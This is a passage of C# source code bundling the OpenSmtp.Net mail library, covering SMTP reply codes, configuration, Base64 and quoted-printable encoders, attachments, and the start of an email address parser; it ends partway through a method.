   /*
       This program is free software; you can redistribute it and/or modify
       it under the terms of the GNU General Public License as published by
       the Free Software Foundation; version 2 only.

       This program is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       GNU General Public License for more details.

       You should have received a copy of the GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */



   using System;
   using System.Globalization;
   using System.Threading;
   using System.IO;
   using System.Collections;
   using System.Text;
   using System.Text.RegularExpressions;
   using System.Net;
   using System.Net.Sockets;
   using System.Reflection;
   using System.Diagnostics;


   /****************************************************************************
    *                                      *
    *              SMTP-Library                    *
    *              Taken from OpenSMTP                 *
    *        Entire project relicensed under GPLv2             *
    *                                      *
    *                                      *
    *                START                     *
    *                                      *
    *                                      *
    ****************************************************************************/

   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;
   using System.IO;

       /// <summary>
       /// This is a Log class. You can log text messages to a
       /// text file and/or the event log
       /// </summary>
       internal class Log
       {

           internal Log()
           {}

           /**
           * Logs string message to TextFile
           */
           internal void logToTextFile(String path, String msg, String source)
           {
               if (path != null && msg != null && source != null)
               {
                   try
                   {
                       // If the log file exists make sure it is not over the maximum allowable size
                       if (File.Exists(path)) {
                           if (new FileInfo(path).Length < SmtpConfig.LogMaxSize) {
                               WriteToFile(path, msg, source);
                           }
                       }
                       else
                       {
                               WriteToFile(path, msg, source);
                       }
                   }
                   catch(Exception e)
                   { Console.WriteLine("An exception occured in logToTextFile: " + e); }
               }
               else
               {
                   throw new SmtpException("Null value supplied to Log.logToTextFile().");
               }
           }

           private void WriteToFile(string path, string msg, string source)
           {
               StreamWriter sw = new StreamWriter(path, true);
               sw.Write(source + msg);
               sw.Close();
           }
       }

   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;

       /// <summary>
       /// This Type is used to store known SMTP responses specified by RFC 821 and 2821
       /// </summary>
       internal class ReplyConstants
       {
           private ReplyConstants()
           {}

           public static readonly string SYSTEM_STATUS                 = "211";
           public static readonly string HELP_MSG                      = "214";
           public static readonly string HELO_REPLY                    = "220";
           public static readonly string QUIT                          = "221";
           public static readonly string AUTH_SUCCESSFUL               = "235";
           public static readonly string OK                            = "250";
           public static readonly string NOT_LOCAL_WILL_FORWARD        = "251";
           public static readonly string SERVER_CHALLENGE              = "334";
           public static readonly string START_INPUT                   = "354";
           public static readonly string SERVICE_NOT_AVAILABLE         = "421";
           public static readonly string MAILBOX_BUSY                  = "450";
           public static readonly string ERROR_PROCESSING              = "451";
           public static readonly string INSUFFICIENT_STORAGE          = "452";
           public static readonly string UNKNOWN                       = "500";
           public static readonly string SYNTAX_ERROR                  = "501";
           public static readonly string CMD_NOT_IMPLEMENTED           = "502";
           public static readonly string BAD_SEQUENCE                  = "503";
           public static readonly string NOT_IMPLEMENTED               = "504";
           public static readonly string SECURITY_ERROR                = "505";
           public static readonly string ACTION_NOT_TAKEN              = "550";
           public static readonly string NOT_LOCAL_PLEASE_FORWARD      = "551";
           public static readonly string EXCEEDED_STORAGE_ALLOWANCE    = "552";
           public static readonly string MAILBOX_NAME_NOT_ALLOWED      = "553";
           public static readonly string TRANSACTION_FAILED            = "554";

           public static readonly string PIPELINING                    = "PIPELINING";

       }
   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/

   using System;

       /// <summary>
       /// This is an System.Exception class for handling
       /// an invalid RFC 822 EmailAddress.</summary>
       public class MalformedAddressException:ApplicationException
       {
           public MalformedAddressException (String message) : base (message) {}

           public MalformedAddressException (String message, System.Exception inner) : base(message,inner) {}
       }
   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;
   using System.IO;

       /// <summary>
       /// This type stores configuration information for the smtp component.
       /// WARNING: If you turn on logging the caller must have proper permissions
       /// and the log file will grow very quickly if a lot of email messages are
       /// being sent. PLEASE USE THE LOGGING FEATURE FOR DEBUGGING ONLY.
       /// </summary>
       public class SmtpConfig
       {
           private SmtpConfig()
           {}

           ///<value>Stores the default SMTP host</value>
           public static string    SmtpHost            = "localhost";

           ///<value>Stores the default SMTP port</value>
           public static int       SmtpPort            = 25;

           ///<value>Flag used for turning on and off logging to a text file.
           /// The caller must have proper permissions for this to work</value>
           public static bool      LogToText           = false;

           ///<value>Path to use when logging to a text file.
           /// The caller must have proper permissions for this to work</value>
           public static string    LogPath             = @"../logs/SmtpLog.txt";

           public static long      LogMaxSize          = 1048576; // one meg

           ///<value>Path used to store temp files used when sending email messages.
           /// The default value is the temp directory specified in the Environment variables.</value>
           public static string    TempPath            = Path.GetTempPath();

           ///<value>Flag used to turn on and off address format verification.
           /// If it is turned on all addresses must meet RFC 822 format.
           /// The default value is false.
           /// WARNING: Turning this on will decrease performance.</value>
           public static bool      VerifyAddresses     = false;

           ///<value>Version of this OpenSmtp SMTP .Net component</value>
           public static readonly string Version       = "OpenSmtp.net version 01.11.0";

           ///<value>Mailer header added to each message sent</value>
           internal static string  X_MAILER_HEADER     = "X-Mailer: OpenSmtp.net";
       }
   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/

   using System;

       /// <summary>
       /// This is a System.Exception class for handling exceptions in
       /// MIME Parsing operations.
       /// </summary>
       public class ParseException:ApplicationException
       {
           public ParseException (String message) : base (message) {}

           public ParseException (String message, System.Exception inner) : base(message,inner) {}
       }

   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;

       /// <summary>
       /// This is a System.Exception class for handling exceptions in
       /// SMTP operations.
       /// </summary>
       public class SmtpException:ApplicationException
       {
           public SmtpException (String message) : base (message) {}

           public SmtpException (String message, System.Exception inner) : base(message,inner) {}
       }
   }


   namespace OpenSmtp.Mail
   {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/

   using System;
   using System.Security.Cryptography;
   using System.Globalization;
   using System.IO;
   using System.Text;

       /// <summary>
       /// This Type is used to encode and decode files and strings using
       /// MIME compatible encoding methods such as Base64 and quoted-printable
       /// </summary>
       internal class MailEncoder
       {

           private MailEncoder()
           {}
           /// <summary>Encodes a String using Base64 (see RFC 1521)</summary>
           /// <param name="s">string to be encoded</param>
           /// <example>
           /// <code>
           /// string base64EncodedText = MailEncoder.ConvertQP("??");
           /// </code>
           /// </example>
           /// <returns>Base64 encoded string</returns>
           internal static string ConvertToBase64(String s)
           {
               byte[] from = Encoding.ASCII.GetBytes(s.ToCharArray());
               string returnMsg = Convert.ToBase64String(from);

               return returnMsg;
           }


           /// <summary> Encodes a FileStream using Base64 (see RFC 1521)</summary>
           /// <param name="inputFilePath">UNC path to file that needs to be encoded</param>
           /// <param name="outputFilePath">UNC path to file will store Base64 encoded ASCII text</param>
           /// <example>
           /// <code>
           /// MailEncoder.ConvertBase64("file.jpg", "file.txt");
           /// </code>
           /// </example>
           internal static void ConvertToBase64(string inputFilePath, string outputFilePath)
           {
               //Create the file streams to handle the input and output files.
               FileStream fin = new FileStream(inputFilePath, FileMode.Open, FileAccess.Read);
               ConvertToBase64(fin, outputFilePath);
               fin.Close();
           }

           /// <summary> Encodes a FileStream using Base64 (see RFC 1521)</summary>
           /// <param name="inputStream">The stream that needs to be encoded</param>
           /// <param name="outputFilePath">UNC path to file will store Base64 encoded ASCII text</param>
           /// <example>
           /// <code>
           /// MailEncoder.ConvertBase64(Stream, "file.txt");
           /// </code>
           /// </example>
           internal static void ConvertToBase64(Stream inputStream, string outputFilePath)
           {
               //Create the file streams to handle the input and output files.
               FileStream fout = new FileStream(outputFilePath, FileMode.OpenOrCreate, FileAccess.Write);
               fout.SetLength(0);

               ToBase64Transform transformer = new ToBase64Transform();

               //Create variables to help with read and write below.
               //This is intermediate storage for the encryption:
               byte[] bin = new byte[inputStream.Length / transformer.InputBlockSize * transformer.OutputBlockSize];
               long rdlen = 0;              //This is the total number of bytes written.
               long totlen = inputStream.Length;    //This is the total length of the input file.
               int len;                     //This is the number of bytes to be written at a time.

               CryptoStream encStream = new CryptoStream(fout, transformer, CryptoStreamMode.Write);

               //Read from the input file, then encrypt and write to the output file.
               while(rdlen < totlen)
               {
                   len = inputStream.Read(bin, 0, (int)inputStream.Length);
                   encStream.Write(bin, 0, len);
                   //inputBlock size(3)
                   rdlen = (rdlen + ((len / transformer.InputBlockSize) * transformer.OutputBlockSize));
               }

               encStream.Close();
               fout.Close();
           }

           internal static string ConvertFromBase64(string s)
           {
               byte[] ret = Convert.FromBase64String(s);
               return Encoding.ASCII.GetString(ret, 0, ret.Length);
           }

           internal static void ConvertFromBase64(string inputFilePath, string outputFilePath)
           {
               //Create the file streams to handle the input and output files.
               FileStream fin = new FileStream(inputFilePath, FileMode.Open, FileAccess.Read);
               FileStream fout = new FileStream(outputFilePath, FileMode.OpenOrCreate, FileAccess.Write);
               fout.SetLength(0);

               FromBase64Transform transformer = new FromBase64Transform();

               //Create variables to help with read and write below.
               //This is intermediate storage for the decryption:
               byte[] bin = new byte[fin.Length / transformer.InputBlockSize * transformer.OutputBlockSize];
               long rdlen = 0;              //This is the total number of bytes written.
               long totlen = fin.Length;    //This is the total length of the input file.
               int len;                     //This is the number of bytes to be written at a time.

               CryptoStream encStream = new CryptoStream(fout, transformer, CryptoStreamMode.Write);

               //Read from the input file, then decrypt and write to the output file.
               while(rdlen < totlen)
               {
                   len = fin.Read(bin, 0, (int)fin.Length);
                   encStream.Write(bin, 0, len);
                   rdlen = (rdlen + ((len / transformer.InputBlockSize) * transformer.OutputBlockSize));
               }

               encStream.Close();
               fout.Close();
               fin.Close();
           }

           /// <summary> Encodes a string using Quoted-Printable encoding (see RFC 1521)</summary>
           /// <param name="s">string that needs to be encoded</param>
           /// <param name="charset">charset of string that needs to be encoded</param>
           /// <example>
           /// <code>
           /// string qpEncodedText = MailEncoder.ConvertQP("??");
           /// </code>
           /// </example>
           /// <returns>Quoted-Printable encoded string</returns>
           internal static string ConvertToQP(string s, string charset)
           {
               // TURNER.BSD MODIFIED 9/10/2004 GKW to fix NUMEROUS bugs
               // Conforms to rules described in http://www.fourmilab.ch/webtools/qprint/rfc1521.html

               if (s == null) {return null;}
               if (charset==null) charset = "ISO-8859-1"; // default charset

               // environment newline char
               char[] nl = Environment.NewLine.ToCharArray();

               // source char array
               char[] source = s.ToCharArray();
               char ch;

               StringBuilder sb = new StringBuilder();
               StringBuilder currLine = new StringBuilder();
               bool bNewline = false;

               Encoding oEncoding = Encoding.GetEncoding(charset);

               for(int sidx=0; sidx < s.Length; sidx++)
               {
                   ch = source[sidx];

                   // RULE # 4: LINE BREAKS
                   if (ch == nl[0] && sidx <= (s.Length - nl.Length))
                   {
                       // peek ahead make sure the "whole" newline is present
                       if (s.Substring(sidx, nl.Length)==Environment.NewLine)
                       {
                           // RULE #3: ENCODE WHITESPACE PRECEEDING A HARD BREAK
                           if (currLine.Length > 0)
                           {
                               if (source[sidx-1] == ' ')
                               {   // if char is preceded by space char add =20
                                   currLine.Remove(currLine.Length - 1, 1);
                                   currLine.Append("=20");
                               }
                               else if (source[sidx-1] == '\t')
                               {   // if char is preceded by tab char add =09
                                   currLine.Remove(currLine.Length - 1, 1);
                                   currLine.Append("=09");
                               }
                           }

                           // flag for new line
                           bNewline = true;
                           sidx += nl.Length - 1;  // jump ahead

                       }
                       else
                       {   // not actually a newline.  Encode per Rule #1
                           currLine.Append("=0" + Convert.ToString((byte)ch, 16).ToUpper());
                       }
                   }
                       // RULE #1 and #2
                       // Optional characters are: !"#$@[\]^`{|}~
                   else if(ch > 126 || (ch < 32 && ch != '\t') || ch == '=')
                   {
                       byte[] outByte = new byte[10];
                       int iCount = oEncoding.GetBytes("" + ch, 0, 1, outByte, 0 );

                       for(int i = 0; i < iCount; i ++)
                       {
                           if (outByte[i]<16)
                               currLine.Append( "=0" + Convert.ToString( outByte[i], 16 ).ToUpper());
                           else
                               currLine.Append( "=" + Convert.ToString( outByte[i], 16 ).ToUpper());
                       }
                   }
                   else
                   {
                       currLine.Append(ch);
                   }

                   // Rule #5: MAXIMUM length 76 characters per line
                   if (currLine.Length >= 76)
                   {
                       // just make sure not to split an encoded char
                       string cLine = currLine.ToString();
                       int breakAt = cLine.LastIndexOf("=");
                       if (breakAt<70) breakAt = 74;
                       sb.Append(cLine.Substring(0, breakAt) + "=\r\n");
                       currLine = new StringBuilder(cLine.Substring(breakAt));
                   }

                   if (bNewline)
                   {
                       // RFC 822 linebreak = CRLF
                       sb.Append(currLine.ToString() + "\r\n");
                       currLine = new StringBuilder();
                       bNewline = false;
                   }
               }

               // add last line
               sb.Append(currLine.ToString());

               return sb.ToString();
           }

           /// <summary>
           /// Convert to Quoted Printable if necessary
           /// </summary>
           /// <param name="s"></param>
           /// <param name="charset"></param>
           /// <param name="forceconversion">force a conversion</param>
           /// <returns></returns>
           internal static string ConvertHeaderToQP(string s, string charset, bool forceconversion)
           {
               if (!forceconversion)
               {
                   bool needsconversion=false;
                   for (int i=0; i<s.Length; i++)
                   {
                       if (s[i] > 126 || s[i] < 32)
                       {
                           needsconversion=true;
                           break;
                       }
                   }
                   if (!needsconversion)
                   {
                       return s;
                   }
               }
               return "=?" + charset + "?Q?" + ConvertToQP(s, charset) + "?=";
           }

           /// <summary>
           /// Convert to Quoted printable if necessary.
           /// </summary>
           /// <param name="s"></param>
           /// <param name="charset"></param>
           /// <returns></returns>
           internal static string ConvertHeaderToQP(string s, string charset)
           {
               return ConvertHeaderToQP(s, charset, false);
           }

           internal static string ConvertFromQP(string s)
           {
               if (s == null) return null;

               // source char array:
               char[] source = s.ToCharArray();
               // result char array:
               char[] result = new char[(int)(s.Length*1.1)];
               // environment newline char:
               char[] nl = Environment.NewLine.ToCharArray();

               int last = 0,
                   didx = 0,
                   slen = (int)s.Length;

               for ( int sidx = 0; sidx<slen; )
               {
                   char ch = source[sidx++];

                   if (ch == '=')
                   {

                       // Premature EOF
                       if ( sidx >= slen-1 )
                       { throw new ParseException("Premature EOF"); }

                       // RULE # 5
                       if ( source[sidx] == '\n' || source[sidx] == '\r' )
                       {
                           sidx++;
                           if ( source[sidx-1] == '\r' && source[sidx] == '\n' )
                           {
                               sidx++;
                           }
                       }
                       // RULE # 1
                       else {
                           char repl;
                           int hi = Int32.Parse(Convert.ToString(source[sidx]), NumberStyles.HexNumber);
                           int lo = Int32.Parse(Convert.ToString(source[sidx+1]), NumberStyles.HexNumber);

                           if ( (hi | lo) < 0 )
                           {
                               throw new ParseException(new String(source, sidx-1, 3) + " is an invalid code"); }
                           else
                           {
                               repl = (char) (hi << 4 | lo);
                               sidx += 2;
                           }

                           result[didx++] = repl;
                       }

                       last = didx;

                       // RULE # 4
                       if ( ch == '\n' || ch == '\r' )
                       {
                           if ( ch == '\r' && sidx < slen && source[sidx] == '\n' )
                           {
                               sidx++;

                               for ( int idx=0; idx < nl.Length; idx++ ) {
                                   result[last++] = nl[idx];
                                   didx = last;
                               }
                           }
                           else {
                               result[didx++]  =ch;
                               // RULE # 3
                               if ( ch != ' ' && ch != '\t' ) {
                                   last = didx;
                               }
                           }

                           if ( didx > result.Length-nl.Length-2 ) {
                               char[] newCharArray = new char[(int)(result.Length+500)];
                               Array.Copy(result, newCharArray, result.Length);
                               result = newCharArray;
                           }
                       }

                   }
               }

               return new String(result, 0, didx);
           }

           internal static bool IsAscii(string s)
           {
                // source char array
                char[] source = s.ToCharArray();
                for(int sidx=0; sidx < s.Length; sidx++)
                {
                    char ch = source[sidx];
                    if (Convert.ToInt32(ch) > 127)
                    {
                        return false;
                    }
                }

                return true;
           }

       }
   }



   namespace OpenSmtp.Mail {

   using System;

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/

       /// <summary>
       /// This Type is used to store Mail Headers
       /// <seealso cref="MailMessage"/>
       /// </summary>
       public class MailHeader
       {
           internal string name;
           internal string body;

           public MailHeader(string headerName, string headerBody)
           {
               this.name = headerName;
               this.body = headerBody;
           }

           public string Name
           {
           get { return this.name; }
           set { this.name = value; }
           }

           public string Body
           {
               get { return this.body; }
               set { this.body = value; }
           }

       }


   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


       using System;
       using System.IO;
       using Microsoft.Win32;
       using System.Text;

       /// <summary>
       /// This Type stores a file attachment. There can be many attachments in each MailMessage
       /// <seealso cref="MailMessage"/>
       /// </summary>
       /// <example>
       /// <code>
       /// MailMessage msg = new MailMessage();
       /// Attachment a = new Attachment("C:\\file.jpg");
       /// msg.AddAttachment(a);
       /// </code>
       /// </example>
       public class Attachment: IComparable
       {

           internal string     name;
           internal string     mimeType;
           internal string     encoding = "base64";
           internal string     filePath;
           internal int        size = 0;
           internal string     encodedFilePath;
           // start added by mb
           internal string     contentid=null;
           // end added by mb

           /// <summary>Constructor using a file path</summary>
           /// <example>
           /// <code>Attachment a = new Attachment("C:\\file.jpg");</code>
           /// </example>
           public Attachment(string filePath)
           {
               this.filePath = filePath;

               if (filePath.Length > 0)
               {
                   try
                   {
                       FileInfo fileInfo = new FileInfo(filePath);
                       if (fileInfo.Exists)
                       {
                           this.mimeType = getMimeType(fileInfo.Extension);
                           this.name = fileInfo.Name;
                           this.size = (int)fileInfo.Length;

                           string encodedTempFile = Path.GetTempFileName();
                           MailEncoder.ConvertToBase64(filePath, encodedTempFile);
                           this.encodedFilePath = encodedTempFile;
                       }
                   }
                   catch(ArgumentNullException)
                   {
                       throw new SmtpException("Attachment file does not exist or path is incorrect.");
                   }
               }
           }

           /// <summary>Constructor using a provided Stream</summary>
           /// <example>
           /// <code>Attachment a = new Attachment(new FileStrema(@"C:\file.jpg", FileMode.Open, FileAccess.Read), "file.jpg");</code>
           /// </example>
           public Attachment(Stream stream, string fileName)
           {
               try
               {
                   this.mimeType = "unknown/application";
                   this.name = fileName;
                   this.size = (int)stream.Length;

                   string encodedTempFile = Path.GetTempFileName();
                   MailEncoder.ConvertToBase64(stream, encodedTempFile);
                   this.encodedFilePath = encodedTempFile;
               }
               catch(ArgumentNullException)
               {
                   throw new SmtpException("Attachment file does not exist or path is incorrect.");
               }
           }


           ~Attachment()
           {
               // delete temp file used for temp encoding of large files
               try
               {
                   if (this.encodedFilePath != null)
                   {
                       FileInfo fileInfo = new FileInfo(this.encodedFilePath);
                       if (fileInfo.Exists) { fileInfo.Delete(); }
                   }
               }
               catch(ArgumentNullException)
               { }
           }

           /// <value> Stores the Attachment Name</value>
           public string Name
           {
               get { return(this.name); }
               set { this.name = value; }
           }

           public string ContentId
           {
               get { return(this.contentid); }
               set { this.contentid = value; }
           }


           /// <value> Stores the MIME content-type of the attachment</value>
           public string MimeType
           {
               get { return(this.mimeType); }
               set { this.mimeType = value; }
           }

           /// <value> Returns the MIME content-encoding type of the attachment</value>
           public string Encoding
           {
               get { return(this.encoding); }
           }

           /// <value> Returns the path of an attached file</value>
           public string FilePath
           {
               get { return(this.filePath); }
           }

           /// <value> Returns the attachment size in bytes</value>
           public int Size
           {
               get { return(this.size); }
           }

           /// <value>When the file is encoded it is stored in temp directory until sendMail() method is called.
           /// This property retrieves the path to that temp file.</value>
           internal string EncodedFilePath
           {
               get { return(this.encodedFilePath) ; }
           }

           /// <summary>Returns the MIME content-type for the supplied file extension</summary>
           /// <returns>String MIME type (Example: \"text/plain\")</returns>
           private string getMimeType(string fileExtension)
           {
               try
               {
                   RegistryKey extKey = Registry.ClassesRoot.OpenSubKey(fileExtension);
                   string contentType = (string)extKey.GetValue("Content Type");

                   if (contentType.ToString() != null)
                   {
                       return contentType.ToString();
                   }
                   else
                   { return "application/octet-stream"; }
               }
               catch(System.Exception)
               { return "application/octet-stream"; }
           }

           public int CompareTo(object attachment)
           {
               // Order instances based on the Date
               return (this.Name.CompareTo(((Attachment)(attachment)).Name));
           }

           /// <summary>returns the file name from a parsed file path</summary>
           /// <param name="filePath">UNC file path to file (IE: "C:\file.txt")</param>
           /// <returns>string file name (Example: \"test.zip\")</returns>
           private string getFileName(string filePath)
           {
               return filePath.Substring(filePath.LastIndexOf("\\")+1);
           }

           /// <summary>
           /// Encode the file for inclusion as a mime attachment.
           /// The boundaries are not provided.
           /// </summary>
           /// <returns></returns>

           public String ToMime()
           {
               StringBuilder sb=new StringBuilder();
               if (ContentId!=null)
               {
                   sb.Append("Content-ID: <" + ContentId + ">\r\n");
               }
               sb.Append("Content-Type: " + mimeType + ";\r\n");
               sb.Append(" name=\"" + MailEncoder.ConvertToQP(name,null) + "\"\r\n");
               sb.Append("Content-Transfer-Encoding: " + encoding + "\r\n");
               sb.Append("Content-Disposition: attachment;\r\n");
               sb.Append(" filename=\"" + MailEncoder.ConvertToQP(name,null) + "\"\r\n\r\n");

               FileStream fin = new FileStream(encodedFilePath, FileMode.Open, FileAccess.Read);

               byte[] bin;

               while (fin.Position != fin.Length)
               {
                   bin = new byte[76];
                   int len = fin.Read(bin, 0, 76);
                   sb.Append(System.Text.Encoding.UTF8.GetString(bin , 0, len)+"\r\n");
               }

               fin.Close();
               return sb.ToString();
           }

       }
   }


   namespace OpenSmtp.Mail {



   /******************************************************************************

       Copyright 2001-2005 Ian Stallings

       OpenSmtp.Net is free software; you can redistribute it and/or modify

       it under the terms of the Lesser GNU General Public License as published by

       the Free Software Foundation; either version 2 of the License, or

       (at your option) any later version.



       OpenSmtp.Net is distributed in the hope that it will be useful,

       but WITHOUT ANY WARRANTY; without even the implied warranty of

       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

       Lesser GNU General Public License for more details.



       You should have received a copy of the Lesser GNU General Public License

       along with this program; if not, write to the Free Software

       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

   /*******************************************************************************/



       using System;

       using System.Text.RegularExpressions;



       /// <summary>This enumeration stores the Address type</summary>

       /// <example>

       /// <code>

       /// msg.AddRecipient(ccAddress, AddressType.Cc);

       /// msg.AddRecipient(bccAddress, AddressType.Bcc);

       /// </code>

       /// </example>

       public enum AddressType

       {

          To = 1,

          Cc = 2,

          Bcc = 3

       }



       /// <summary>This Type stores a rfc822 email address and a name for that

       /// particular address (Example: "John Smith, jsmith@nowhere.com")

       /// </summary>

       /// <example>

       /// <code>

       /// EmailAddress from = new EmailAddress("user@url.com", "John Smith");

       /// EmailAddress to = new EmailAddress("support@OpenSmtp.com");

       /// MailMessage msg = new MailMessage(from, to);

       /// </code>

       /// </example>

       public class EmailAddress

       {

           internal    string  address;

           internal    string  name;

           internal    string  mailbox;

           internal    string  localpart;

           private     string  domain;

           private     string  quotedstr;

           private     bool    isvalid = false;



           private const string Escape     = @"\\";

           private const string Period     = @"\.";

           private const string Space      = @"\040";

           private const string Tab        = @"\t";

           private const string OpenBr     = @"\[";

           private const string CloseBr    = @"\]";

           private const string OpenParen  = @"\(";

           private const string CloseParen = @"\)";

           private const string NonAscii   = @"\x80-\xff";

           private const string Ctrl       = @"\000-\037";

           private const string CRList     = @"\n\015";





           static EmailAddress()
           {
               EmailAddress.InitializeRegex();
           }



           /// <summary>Constructor using RFC 822 formatted email mesage</summary>

           /// <example>

           /// <code>EmailAddress a = new EmailAddress("support@OpenSmtp.com");</code>

           /// </example>

           public EmailAddress(string address)

           {

               if (SmtpConfig.VerifyAddresses)

               {

                   //EmailAddress.initregex();

                   Parse(address);

               }



               this.address = address;

           }



           /// <summary>Constructor using RFC 822 formatted email mesage and a friendly

           /// name associated with that email address</summary>

           /// <example>

           /// <code>EmailAddress a = new EmailAddress("support@OpenSmtp.com", "John Smith");</code>

           /// </example>

           public EmailAddress(string address, string name)

           {

               if (SmtpConfig.VerifyAddresses)

               {

                   //initregex();

                   Parse(address);

               }



               this.address = address;

               this.name    = name;

           }



           /// <value>Stores a RFC 822 formatted message</value>

           /// <seealso cref="SmtpConfig.VerifyAddresses"/>

           /// <example>"support@OpenSmtp.com"</example>

           public string Address

           {

               get { return(this.address); }

               set {

                       if (SmtpConfig.VerifyAddresses)

                       { Parse(value); }

                       this.address = value;

                   }

           }



           /// <value>Stores a name associated with the Address</value>

           /// <example>"John Smith"</example>

           public string Name

           {

               get { return(this.name); }

               set { this.name = value; }

           }



           public string LocalPart

           {

               get { return localpart; }

           }



           public string Domain

           {

               get { return domain; }

           }



           public string QuotedString

           {

               get { return quotedstr; }

           }



           public string Mailbox

           {

               get { return mailbox; }

           }



           public bool IsValid

           {

               get { return isvalid; }

           }



           public bool Parse(string email)

           {

               // Match against the regex...

